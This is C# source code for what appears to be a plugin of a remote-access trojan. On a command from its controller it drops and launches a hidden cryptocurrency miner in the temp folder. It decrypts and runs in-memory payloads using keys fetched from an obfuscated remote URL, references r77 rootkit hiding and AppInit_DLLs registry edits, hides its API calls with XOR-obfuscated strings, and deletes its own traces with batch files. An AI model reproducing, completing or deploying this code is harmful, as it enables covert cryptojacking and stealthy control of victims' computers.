using MessagePackLib.MessagePack;
using Microsoft.CSharp;
using Microsoft.Win32;
using Plugin.Handle;
using Plugin.Other;
using Plugin.Properties;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Plugin
{
    public class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "StartMiner":
                        {
                            Start(unpack_msgpack.ForcePathObject("pool").AsString, unpack_msgpack.ForcePathObject("wallet").AsString, unpack_msgpack.ForcePathObject("password").AsString, unpack_msgpack.ForcePathObject("algo").AsString, unpack_msgpack.ForcePathObject("threads").AsString);
                            break;
                        }
                    case "doStop":
                        {
                            new KillPig();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MessagePackLib.MessagePack.MsgPack msgpack = new MessagePackLib.MessagePack.MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        #region Paths
        static string _InstallFolder = Path.GetTempPath() + "mineworm\\";
        static string _ExePath = _InstallFolder + "mineworm.exe";
        static string libcurl = _InstallFolder + "libcurl-4.dll";
        static string libiconv = _InstallFolder + "libiconv-2.dll";
        static string libidn = _InstallFolder + "libidn-11.dll";
        static string libintl = _InstallFolder + "libintl-8.dll";
        static string libwinpthread = _InstallFolder + "libwinpthread-1.dll";
        static string zlib1 = _InstallFolder + "zlib1.dll";
        static string KillThePig = _InstallFolder + "KillPegMIn.exe";
        static string hidemeass = _InstallFolder + "minewormhide.exe";
        static string install = _InstallFolder + "install.exe";
        static string Minebabyrun = Path.GetTempPath() + "minewormworkout.exe";
        string stub = Properties.Resources.MM;
        Random random = new Random();
        #endregion
        #region Miner
        public static void KillMiner()
        {

            System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), "delexec.bat"));
            file.WriteLine("taskkill /im \"mineworm.exe\" /f & exit");
            file.WriteLine("DEL  %exeFile%");
            file.WriteLine("DEL \"%~f0\"");
            file.Close();
            string chv = Path.Combine(Path.Combine(Path.GetTempPath(), "delexec.bat"));
            Process.Start(new ProcessStartInfo
            {
                FileName = chv,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            }).WaitForExit();
            string pathm = Path.Combine(Path.GetTempPath(), "mineworm");
            Directory.Delete(pathm, true);
            cleantemp();
            Task.Run((Action)RemoveKitRoot).Wait();
            try
            {
                foreach (Process proc in Process.GetProcessesByName("minerd"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("minewormwork"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("mineworm"))
                {
                    proc.Kill();
                }
                foreach (Process proc in Process.GetProcessesByName("mineworm.exe"))
                {
                    proc.Kill();
                }
            }
            catch
            {
                //MessageBox.Show(ex.Message);
            }
        }

        static void RemoveKitRoot()
        {

            try
            {
#pragma warning disable CS0219 // The variable 'removed' is assigned but its value is never used
                bool removed = false;
#pragma warning restore CS0219 // The variable 'removed' is assigned but its value is never used

                foreach (bool is64bit in new[] { true, false })
                {
                    using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", true))
                    {
                        if ((key.GetValue("AppInit_DLLs", "") as string).Contains("$77-"))
                        {
                            key.SetValue("AppInit_DLLs", "");
                            removed = true;
                        }
                        else if ((key.GetValue("AppInit_DLLs", "") as string).Contains("winvnc"))
                        {
                            key.SetValue("AppInit_DLLs", "");
                            removed = true;
                        }
                        else if ((key.GetValue("AppInit_DLLs", "") as string).Contains("mineworm"))
                        {
                            key.SetValue("AppInit_DLLs", "");
                            removed = true;
                        }
                        else if ((key.GetValue("AppInit_DLLs", "") as string).Contains("minerd"))
                        {
                            key.SetValue("AppInit_DLLs", "");
                            removed = true;
                        }
                    }
                }

                //MessageBox.Show(removed ? "r77 was now removed from AppInit_DLLs." : "r77 was not found in AppInit_DLLs.", "Information", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch
            {
                //MessageBox.Show(ex.GetType() + ": " + ex.Message + "\r\n" + ex.StackTrace, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }

        }
        public static void compileMine(string Pool, string Wallet, string Password, string Algo, string Threads)
        {
            string pathm = Path.Combine(Path.GetTempPath(), "mineworm");

            if (Directory.Exists(pathm))
            {
                Directory.Delete(pathm);
                Directory.CreateDirectory(pathm);
            }
            else
            {
                Directory.CreateDirectory(pathm);
            }

            CompilerParameters Params = new CompilerParameters();
            Params.IncludeDebugInformation = false;
            Params.CompilerOptions = " /target:winexe /platform:anycpu /optimize+";
            Params.OutputAssembly = Path.Combine(pathm, "mineworm.exe");

            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Params.ReferencedAssemblies.Add("System.dll");

            string Source = Resources.MM;
            Source = Source.Replace("%pool%", Pool)
            .Replace("%user%", Wallet)
            .Replace("%password%", Password)
            .Replace("%algo%", Algo)
            .Replace("%threads%", Threads);
            //Source = Source.Replace("[path]", comboBox1.SelectedItem.ToString());
            //Source = Source.Replace("[filename]", textBox4.Text);
            //Source = Source.Replace("[iplogger]", textBox5.Text);


            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");

            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source);

            foreach (CompilerError Error in Results.Errors)  //Вывод ошибок
                MessageBox.Show(Error.ToString());

            //Process.Start(new ProcessStartInfo
            //{
            //    FileName = "cmd",
            //    Arguments = $"/k start /b " + Path.Combine(pathm, "mineworm.exe"+ "  & exit"),
            //    CreateNoWindow = true,
            //    WindowStyle = ProcessWindowStyle.Hidden,
            //    UseShellExecute = true,
            //    ErrorDialog = false,
            //});




        }
        public static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        void CompleteStub(string Pool, string Wallet, string Password, string Algo, string Threads)
        {
            stub = stub.Replace("%pool%", Pool)
           .Replace("%user%", Wallet)
           .Replace("%password%", Password)
           .Replace("%threads%", Threads)
           .Replace("%algo%", Algo)
           .Replace("%random%", RandomString(12))
           .Replace("%random1%", RandomString(9))
           .Replace("%random2%", RandomString(15))
           .Replace("%random3%", RandomString(10))
           .Replace("%random4%", RandomString(12))
           .Replace("%mutex%", RandomString(30))
           .Replace("%exeb%", Convert.ToBase64String(Properties.Resources.minerd))
           .Replace("%libcurl%", Convert.ToBase64String(Properties.Resources.libcurl_4))
           .Replace("%libiconv%", Convert.ToBase64String(Properties.Resources.libiconv_2))
           .Replace("%libidn%", Convert.ToBase64String(Properties.Resources.libidn_11))
           .Replace("%libintl%", Convert.ToBase64String(Properties.Resources.libintl_8))
           .Replace("%libwinpthread%", Convert.ToBase64String(Properties.Resources.libwinpthread_1))
           .Replace("%zlib1%", Convert.ToBase64String(Properties.Resources.zlib1));
            stub = stub.Replace("%Startup();%", "Startup();")
           .Replace("%Persistence();%", "Persistence();");
            stub = stub.Replace("%silentmode%", "Hide");


        }

        private string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            char ch;
            for (int i = 1; i < size + 1; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }

            return builder.ToString();
        }
        public async void startall(string PoolPort, string Wallet, string Pass, string Algo, string Threads)
        {
            await Task.Run(async () =>
            {
                CompleteStub(PoolPort, Wallet, Pass, Algo, Threads);
                Compiler.Compile(_ExePath, stub, false);
            });



            //await Task.Run(async () =>
            /// {
            //    try
            ///   {
            //Task.Factory.StartNew(() => MHide()).Wait();

            //   }
            //    catch
            //   {

            //    }
            //});

        }
        #region mrd
        public static void Mstart(string Pool, string Wallet, string Password, string Algo, string Threads)
        {
            string pathm = Path.Combine(Path.GetTempPath(), "mineworm");
            string ngrokvnc = Path.Combine(pathm, "mineworm.bat");
            string workout = Path.Combine(pathm, "mineworm.exe");
            if (File.Exists(workout))
            {
                string exlog = Path.Combine(Path.GetTempPath(), "log.txt");
                System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), ngrokvnc));
                file.WriteLine("set exeFile=" + _ExePath);
                file.WriteLine("set logFile=" + exlog);
                file.WriteLine("%exeFile%  -o " + Pool + " -u " + Wallet + " -p " + Password + " -a " + Algo + " -t " + Threads + " & exit");
                file.WriteLine("DEL " + _ExePath + "");
                file.WriteLine("DEL \"%~f0\"");
                file.Close();
                string chv = Path.Combine(Path.Combine(Path.GetTempPath(), ngrokvnc));
                Process.Start(new ProcessStartInfo
                {
                    FileName = chv,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                }).WaitForExit();
                File.Delete(Path.Combine(Path.GetTempPath(), "minewormworkout.exe"));
            }
            else
            {
                compileMine(Pool, Wallet, Password, Algo, Threads);
                // RunPS(workout);
                string exlog = Path.Combine(Path.GetTempPath(), "log.txt");
                System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), ngrokvnc));
                file.WriteLine("set exeFile=" + _ExePath);
                file.WriteLine("set logFile=" + exlog);
                file.WriteLine("%exeFile%  -o " + Pool + " -u " + Wallet + " -p " + Password + " -a " + Algo + " -t " + Threads + "  & exit");
                file.WriteLine("DEL " + _ExePath + "");
                file.WriteLine("DEL \"%~f0\"");
                file.Close();
                string chv = Path.Combine(Path.Combine(Path.GetTempPath(), ngrokvnc));
                Process.Start(new ProcessStartInfo
                {
                    FileName = chv,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                }).WaitForExit();
            }
            Process[] pname = Process.GetProcessesByName("minerd");
            if (pname.Length == 0)
                Console.WriteLine("nothing");
            else
                RunPS(workout);

            File.Delete(Path.Combine(Path.GetTempPath(), "minewormworkout.exe"));

        }
        public static void InstMin()
        {
            byte[] extract1 = Resources.libcurl_4;
            byte[] extract2 = Resources.libiconv_2;
            byte[] extract3 = Resources.libidn_11;
            byte[] extract4 = Resources.libintl_8;
            byte[] extract5 = Resources.libwinpthread_1;
            byte[] extract6 = Resources.zlib1;
            byte[] extract7 = Resources.minerd;
            byte[] extract8 = Resources.KillPegMIn;
            byte[] extract9 = Resources.Install;
            /*
            var assembly = Assembly.GetExecutingAssembly();
            var resourceName = "Plugin.Plugins.Machete.jpg";

            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            using (StreamReader reader = new StreamReader(stream))
            {
                string result = reader.ReadToEnd();

                if (Directory.Exists(_InstallFolder))
                {
                    Directory.Delete(_InstallFolder, true);
                }

                Directory.CreateDirectory(_InstallFolder);
                Byte[] Minebabybytes = Convert.FromBase64String(Decrypt(resourceName));
                //Task.Run(() => Execute(Minebabybytes)).Wait();
                Task.Factory.StartNew(() => File.WriteAllBytes(Minebabyrun, Minebabybytes)).Wait();
                Process.Start(Minebabyrun);
            }
            */
            Task.Factory.StartNew(() => File.WriteAllBytes(libcurl, extract1)).Wait();
            Task.Factory.StartNew(() => File.WriteAllBytes(libiconv, extract2)).Wait();
            Task.Factory.StartNew(() => File.WriteAllBytes(libidn, extract3)).Wait();
            Task.Factory.StartNew(() => File.WriteAllBytes(libintl, extract4)).Wait();
            Task.Factory.StartNew(() => File.WriteAllBytes(libwinpthread, extract5)).Wait();
            Task.Factory.StartNew(() => File.WriteAllBytes(zlib1, extract6)).Wait();
            Task.Factory.StartNew(() => File.WriteAllBytes(_ExePath, extract7)).Wait();
            Task.Factory.StartNew(() => File.WriteAllBytes(KillThePig, extract8)).Wait();
            Task.Factory.StartNew(() => File.WriteAllBytes(install, extract9)).Wait();
            Task.Factory.StartNew(() => Process.Start(install));

        }
        public static void MHide()
        {
            var assembly = Assembly.GetExecutingAssembly();
            var resourceName = "Plugin.Plugins.Hideme.jpg";

            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            using (StreamReader reader = new StreamReader(stream))
            {
                string result = reader.ReadToEnd();
                Byte[] hidemebytes = Convert.FromBase64String(Decrypt(resourceName));
                Task.Factory.StartNew(() => Execute(hidemebytes)).Wait();
                //File.WriteAllBytes(hidemeass, hidemebytes);
                //Process.Start(hidemeass);
                File.Delete(Path.Combine(Path.GetTempPath(), "r77-x64.dll"));
                File.Delete(Path.Combine(Path.GetTempPath(), "r77-x86.dll"));
            }
            var assemblys = Assembly.GetExecutingAssembly();
            var resourceNames = "Plugin.Plugins.hrdmin.jpg";

            using (Stream stream = assemblys.GetManifestResourceStream(resourceNames))
            using (StreamReader reader = new StreamReader(stream))
            {
                string result = reader.ReadToEnd();

                //rdmin   gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZLpApyDHLbEXqnGn1FyZg7Eq9i/pG9iADhVnXwVkBIvQwJiMaH4nY12/3X8x8A4ufC1uEKwOfFncL3zY4OSoglTCShqS22/MD5ofOX6HxfFjA==
                Byte[] rdminbytes = Convert.FromBase64String(Decrypt(resourceName));
                Task.Factory.StartNew(() => Execute(rdminbytes)).Wait();
                //File.WriteAllBytes(hidemeass, hidemebytes);
                //Process.Start(hidemeass);


                //File.SetAttributes(_InstallFolder, FileAttributes.Hidden | FileAttributes.System);
                //File.SetAttributes(_ExePath, FileAttributes.Hidden | FileAttributes.System);
                //File.SetAttributes(libcurl, FileAttributes.Hidden | FileAttributes.System);
                //File.SetAttributes(libiconv, FileAttributes.Hidden | FileAttributes.System);
                // File.SetAttributes(libidn, FileAttributes.Hidden | FileAttributes.System);
                // File.SetAttributes(libintl, FileAttributes.Hidden | FileAttributes.System);
                // File.SetAttributes(libwinpthread, FileAttributes.Hidden | FileAttributes.System);
                // File.SetAttributes(zlib1, FileAttributes.Hidden | FileAttributes.System);

                string pathm = Path.Combine(Path.GetTempPath(), "minewormworkout.exe");
                File.Delete(pathm);
                File.Delete(Path.Combine(Path.GetTempPath(), "r77-x64.dll"));
                File.Delete(Path.Combine(Path.GetTempPath(), "r77-x86.dll"));
            }
            Byte[] ihidemebytes = Resources.Install;
            Task.Factory.StartNew(() => Execute(ihidemebytes)).Wait();
            //File.WriteAllBytes(hidemeass, hidemebytes);
            //Process.Start(hidemeass);
            File.Delete(Path.Combine(Path.GetTempPath(), "r77-x64.dll"));
            File.Delete(Path.Combine(Path.GetTempPath(), "r77-x86.dll"));

        }
        public static void Execute(byte[] purdi)
        {
            try
            {
                Assembly asm = AppDomain.CurrentDomain.Load((byte[])purdi);
                MethodInfo Metinf = Entry(asm);
                object InjObj = asm.CreateInstance(Metinf.Name);
                object[] parameters = new object[1];
                if (Metinf.GetParameters().Length == 0)
                    parameters = null;
                MethodInfo(Metinf, InjObj, parameters);
            }
            catch { }
        }
        private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
        {
            if (meth != null)
                return meth.Invoke(obj1, obj2);
            else
                return false;
        }
        public static Thread RunFromMemory(byte[] bytes)
        {


            var thread = new Thread(new ThreadStart(() =>
            {
                var assembly = Assembly.Load(bytes);
                MethodInfo method = assembly.EntryPoint;
                if (method != null)
                {
                    method.Invoke(null, null);
                }
            }));

            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();

            return thread;


        }
        private static MethodInfo Entry(Assembly obj)
        {
            if (obj != null)
                return obj.EntryPoint;
            else
                return null;
        }
        public static string Decrypt(string encrypted)
        {
            using (WebClient client = new WebClient())
            {
                client.Proxy = null;
                var Key = client.DownloadString(Encoding.UTF8.GetString(
                    Convert.FromBase64String(
                        "aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2tleVNTLnR4dA==")));
                var IV = client.DownloadString(Encoding.UTF8.GetString(
                    Convert.FromBase64String(
                        "aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2l2U1MudHh0")));

                byte[] encbytes = Convert.FromBase64String(encrypted);
                AesCryptoServiceProvider encdec = new AesCryptoServiceProvider();
                encdec.BlockSize = 128;
                encdec.KeySize = 256;
                encdec.Key = ASCIIEncoding.ASCII.GetBytes(BCutEncrypt(Key));
                encdec.IV = ASCIIEncoding.ASCII.GetBytes(BCutEncrypt(IV));
                encdec.Padding = PaddingMode.PKCS7;
                encdec.Mode = CipherMode.CBC;

                ICryptoTransform icrypt = encdec.CreateDecryptor(encdec.Key, encdec.IV);

                byte[] dec = icrypt.TransformFinalBlock(encbytes, 0, encbytes.Length);
                icrypt.Dispose();

                return ASCIIEncoding.ASCII.GetString(dec);
            }
        }
        #endregion
        public static byte[] DownLoad(string u)
        {
            try
            {
                Type type = typeof(WebClient);
                object instance = Activator.CreateInstance(type, (object[])null);
                object target = type.InvokeMember(BCutEncrypt("Boknoxy"), BindingFlags.GetProperty, (Binder)null, instance, (object[])null);
                target.GetType().InvokeMember(BCutEncrypt("Knn"), BindingFlags.InvokeMethod, (Binder)null, target, new object[2]
                {
                    (object) BCutEncrypt("\x007Fyox'kmod~"),
                    (object) BCutEncrypt("Gepcffk%?$:*\"]cdne}y*D^*;:$:1*]cd<>1*r<>#*Kzzfo]ohAc~%?9=$9<*\"AB^GF&*fcao*Moiae#")
                });

                return type.InvokeMember(BCutEncrypt("Ne}dfeknNk~k"), BindingFlags.InvokeMethod, (Binder)null, instance, new object[1]
                {
                    (object) u
                }) as byte[];
            }
            catch
            {
                return (byte[])null;
            }
        }
        public static string BCutEncrypt(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ (uint)ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
        public static void Exec(string path, string parameter, object show)
        {
            try
            {
                Type typeFromClsid = Type.GetTypeFromCLSID(new Guid(BCutEncrypt("3HK:?3=8'L<K2';;IL'K>>8'::K:I3:K2L93")));
                object instance = Activator.CreateInstance(typeFromClsid);
                object target1 = typeFromClsid.InvokeMember(BCutEncrypt("c~og"), BindingFlags.InvokeMethod, (Binder)null, instance, (object[])null);
                object target2 = target1.GetType().InvokeMember(BCutEncrypt("Nei\x007Fgod~"), BindingFlags.GetProperty, (Binder)null, target1, (object[])null);
                object target3 = target2.GetType().InvokeMember(BCutEncrypt("Kzzfcik~ced"), BindingFlags.GetProperty, (Binder)null, target2, (object[])null);
                target3.GetType().InvokeMember(BCutEncrypt("YboffOroi\x007F~o"), BindingFlags.InvokeMethod, (Binder)null, target3, new object[5]
                {
                    (object) path,
                    (object) parameter,
                    (object) "",
                    null,
                    show
                });
            }
            catch
            {
            }
        }

        #endregion
        public static void Start(string Pool, string Wallet, string Password, string Algo, string Threads)
        {
            //  Task.Factory.StartNew(() => Mstart(Pool, Wallet, Password, Algo, Threads)).Wait();
            try
            {
                Task.Run(() => InstMin()).Wait();

            }
            catch
            {

            }


            try
            {
                Task.Run(() => compileMine(Pool, Wallet, Password, Algo, Threads)).Wait();

            }
            catch
            {

            }



            try
            {
                Task.Run(() => MHide()).Wait();

            }
            catch
            {

            }



            try
            {
                Task.Run(() => Mstart(Pool, Wallet, Password, Algo, Threads)).Wait();

            }
            catch
            {

            }




        }
        public static void Stop()
        {


            Task.Run(() => KillMiner()).Wait();
        }
    }

}